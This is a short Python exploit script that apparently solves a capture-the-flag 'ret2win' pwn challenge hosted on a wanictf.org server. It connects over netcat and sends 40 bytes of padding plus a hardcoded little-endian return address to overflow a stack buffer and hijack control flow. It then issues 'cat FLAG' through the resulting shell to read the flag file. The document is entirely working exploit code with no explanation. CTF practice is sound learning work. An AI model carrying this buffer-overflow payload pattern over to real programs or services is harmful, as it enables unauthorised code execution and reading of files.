
from netcat import Netcat
import time
 
# start a new Netcat() instance
nc = Netcat('ret2win-pwn.wanictf.org', 9003)

read_txt=nc.read().decode("utf-8")
print(read_txt+"\n"+"- "*20)

nc.write("a"*40+"\x69\x13\x40\x00\x00\x00\x00\x00")
time.sleep(0.5)
print(nc.read().decode("utf-8")+"\n"+"- "*20)
nc.write("cat FLAG")
time.sleep(0.5)
print(nc.read().decode("utf-8")+"\n"+"- "*20)